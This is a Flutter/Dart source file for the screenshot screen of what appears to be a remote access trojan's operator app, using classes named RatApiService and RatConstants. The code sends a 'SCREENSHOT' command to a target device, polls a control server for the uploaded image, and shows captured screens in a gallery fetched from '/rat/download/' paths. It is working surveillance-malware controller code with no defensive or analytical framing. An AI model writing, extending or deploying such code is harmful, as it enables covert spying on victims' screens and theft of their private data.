import 'package:flutter/material.dart';
import 'package:url_launcher/url_launcher.dart';
import 'dart:convert';
import 'api_service.dart';
import 'constants.dart';

// ============================================================
// GRID PATTERN PAINTER
// ============================================================
class _ScreenshotGridPatternPainter extends CustomPainter {
  final Color gridColor;
  final double spacing;
  
  const _ScreenshotGridPatternPainter({
    required this.gridColor,
    this.spacing = 25,
  });
  
  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()
      ..color = gridColor
      ..style = PaintingStyle.stroke
      ..strokeWidth = 0.6;
    
    for (double x = 0; x < size.width; x += spacing) {
      canvas.drawLine(Offset(x, 0), Offset(x, size.height), paint);
    }
    
    for (double y = 0; y < size.height; y += spacing) {
      canvas.drawLine(Offset(0, y), Offset(size.width, y), paint);
    }
  }
  
  @override
  bool shouldRepaint(covariant CustomPainter oldDelegate) => false;
}

const _kBg   = Color(0xFF111827);
const _kCard = Color(0xFF1F2937);
const _kBlue = Color(0xFF3B82F6);
const _kCyan = Color(0xFF06B6D4);
const _kSub  = Color(0xFF9CA3AF);

class ScreenshotGalleryScreen extends StatefulWidget {
  final String deviceId;
  final String sessionKey;
  const ScreenshotGalleryScreen({super.key, required this.deviceId, required this.sessionKey});

  @override
  State<ScreenshotGalleryScreen> createState() => _ScreenshotGalleryScreenState();
}

class _ScreenshotGalleryScreenState extends State<ScreenshotGalleryScreen> {
  late RatApiService _api;
  bool _isLoading = false;
  String? _photoUrl;
  String _status = 'Ready to capture';
  List<dynamic> _history = [];

  @override
  void initState() {
    super.initState();
    _api = RatApiService(widget.sessionKey);
    _fetchHistory();
  }

  Future<void> _fetchHistory() async {
    try {
      final h = await _api.getCameraHistory(widget.deviceId);
      setState(() {
        _history = h;
        if (_history.isNotEmpty && _photoUrl == null) {
          _photoUrl = '${RatConstants.baseUrl}${_history[0]['url']}?key=${widget.sessionKey}';
        }
      });
    } catch (e) { /* silent */ }
  }

  Future<void> _takePhoto() async {
    setState(() { _isLoading = true; _status = 'Sending screenshot command...'; });
    try {
      await _api.sendCommand(widget.deviceId, 'SCREENSHOT');
      setState(() => _status = 'Waiting for upload...');
      for (int i = 0; i < 30; i++) {
        await Future.delayed(const Duration(seconds: 1));
        final resp = await _api.getLastResponse(widget.deviceId);
        
        if (resp != null && resp['type'] == 'UPLOAD_COMPLETED') {
          try {
            final content = jsonDecode(resp['content'].toString());
            final fn = content['file'];
            final folder = content['folder'] ?? 'screenshot';
            
            setState(() {
              _photoUrl = '${RatConstants.baseUrl}/XzV/rat/download/${widget.deviceId}/$folder/$fn?key=${widget.sessionKey}';
              _status = 'Captured!';
              _isLoading = false;
            });
            _fetchHistory();
            return;
          } catch (e) {
            final c = resp['content'].toString();
            if (c.contains('screenshot/')) {
               final fn = c.split('/').last.trim();
               setState(() {
                 _photoUrl = '${RatConstants.baseUrl}/XzV/rat/download/${widget.deviceId}/screenshot/$fn?key=${widget.sessionKey}';
                 _status = 'Captured!';
                 _isLoading = false;
               });
               _fetchHistory();
               return;
            }
          }
        }
      }
      setState(() { _status = 'Timeout waiting for upload.'; _isLoading = false; });
    } catch (e) { setState(() { _status = 'Error: $e'; _isLoading = false; }); }
  }

  Widget _buildGridBackground() {
    return Positioned.fill(
      child: CustomPaint(
        painter: _ScreenshotGridPatternPainter(
          gridColor: Colors.white.withOpacity(0.03),
          spacing: 30,
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: Stack(
        children: [
          _buildGridBackground(),
          Container(
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [
                  Colors.black.withOpacity(0.85),
                  _kBlue.withOpacity(0.05),
                  Colors.black.withOpacity(0.9)
                ],
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
              ),
            ),
          ),
          SafeArea(
            child: Column(children: [
              // Header
              Padding(
                padding: const EdgeInsets.fromLTRB(16, 16, 16, 0),
                child: Row(children: [
                  GestureDetector(
                    onTap: () => Navigator.pop(context),
                    child: Container(padding: const EdgeInsets.all(8), decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(10), border: Border.all(color: Colors.white12)), child: const Icon(Icons.arrow_back_ios_rounded, color: Colors.white70, size: 16)),
                  ),
                  const SizedBox(width: 12),
                  Container(padding: const EdgeInsets.all(8), decoration: BoxDecoration(gradient: const LinearGradient(colors: [_kBlue, _kCyan]), borderRadius: BorderRadius.circular(10)), child: const Icon(Icons.screenshot_monitor_rounded, color: Colors.white, size: 18)),
                  const SizedBox(width: 12),
                  const Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                    Text('Screenshots', style: TextStyle(color: Colors.white, fontSize: 15, fontWeight: FontWeight.w700)),
                    Text('Remote screen capture gallery', style: TextStyle(color: _kSub, fontSize: 11)),
                  ])),
                  GestureDetector(
                    onTap: _fetchHistory,
                    child: Container(padding: const EdgeInsets.all(8), decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(10), border: Border.all(color: Colors.white12)), child: const Icon(Icons.refresh_rounded, color: Colors.white70, size: 18)),
                  ),
                ]),
              ),
              const SizedBox(height: 12),

              Expanded(
                child: SingleChildScrollView(
                  padding: const EdgeInsets.symmetric(horizontal: 16),
                  physics: const BouncingScrollPhysics(),
                  child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                    // Capture button
                    GestureDetector(
                      onTap: _isLoading ? null : _takePhoto,
                      child: Container(
                        width: double.infinity,
                        padding: const EdgeInsets.symmetric(vertical: 14),
                        decoration: BoxDecoration(
                          gradient: _isLoading ? null : const LinearGradient(colors: [_kBlue, _kCyan]),
                          color: _isLoading ? Colors.grey.shade800 : null,
                          borderRadius: BorderRadius.circular(12),
                          boxShadow: _isLoading ? [] : [BoxShadow(color: _kBlue.withOpacity(0.3), blurRadius: 10)],
                        ),
                        child: Row(mainAxisAlignment: MainAxisAlignment.center, children: [
                          _isLoading
                            ? const SizedBox(width: 18, height: 18, child: CircularProgressIndicator(strokeWidth: 2, color: Colors.white))
                            : const Icon(Icons.screenshot_monitor_rounded, color: Colors.white, size: 18),
                          const SizedBox(width: 8),
                          Text(_isLoading ? _status : 'Capture Screenshot', style: const TextStyle(color: Colors.white, fontWeight: FontWeight.w700, fontSize: 14)),
                        ]),
                      ),
                    ),
                    const SizedBox(height: 16),

                    // Latest preview
                    const Text('Latest Screenshot', style: TextStyle(color: Colors.white, fontSize: 13, fontWeight: FontWeight.w700)),
                    const SizedBox(height: 8),
                    Container(
                      height: 220,
                      width: double.infinity,
                      decoration: BoxDecoration(color: _kCard.withOpacity(0.5), borderRadius: BorderRadius.circular(14), border: Border.all(color: Colors.white.withOpacity(0.08))),
                      child: _photoUrl == null
                        ? const Center(child: Icon(Icons.image_not_supported_rounded, color: Colors.white12, size: 48))
                        : Stack(fit: StackFit.expand, children: [
                            ClipRRect(borderRadius: BorderRadius.circular(14), child: Image.network(_photoUrl!, fit: BoxFit.cover, loadingBuilder: (_, ch, p) => p == null ? ch : const Center(child: CircularProgressIndicator(color: _kBlue, strokeWidth: 2)))),
                            Positioned(bottom: 10, right: 10, child: GestureDetector(
                              onTap: () => launchUrl(Uri.parse(_photoUrl!)),
                              child: Container(padding: const EdgeInsets.all(8), decoration: BoxDecoration(gradient: const LinearGradient(colors: [_kBlue, _kCyan]), borderRadius: BorderRadius.circular(10)), child: const Icon(Icons.open_in_new_rounded, color: Colors.white, size: 16)),
                            )),
                          ]),
                    ),
                    const SizedBox(height: 16),

                    // Gallery
                    const Text('History Gallery', style: TextStyle(color: Colors.white, fontSize: 13, fontWeight: FontWeight.w700)),
                    const SizedBox(height: 8),
                    if (_history.isEmpty)
                      const Padding(padding: EdgeInsets.all(24), child: Center(child: Text('No screenshot history yet.', style: TextStyle(color: _kSub))))
                    else
                      GridView.builder(
                        shrinkWrap: true,
                        physics: const NeverScrollableScrollPhysics(),
                        gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(crossAxisCount: 3, crossAxisSpacing: 8, mainAxisSpacing: 8, childAspectRatio: 1.2),
                        itemCount: _history.length,
                        itemBuilder: (_, i) {
                          final item = _history[i];
                          final url = '${RatConstants.baseUrl}${item['url']}?key=${widget.sessionKey}';
                          return GestureDetector(
                            onTap: () => setState(() => _photoUrl = url),
                            child: Container(
                              decoration: BoxDecoration(
                                borderRadius: BorderRadius.circular(10),
                                border: Border.all(color: _photoUrl == url ? _kBlue : Colors.transparent, width: 2),
                              ),
                              child: ClipRRect(
                                borderRadius: BorderRadius.circular(8),
                                child: Image.network(url, fit: BoxFit.cover, errorBuilder: (_, __, ___) => const Center(child: Icon(Icons.broken_image_rounded, color: Colors.white12))),
                              ),
                            ),
                          );
                        },
                      ),
                    const SizedBox(height: 20),
                  ]),
                ),
              ),
            ]),
          ),
        ],
      ),
    );
  }
}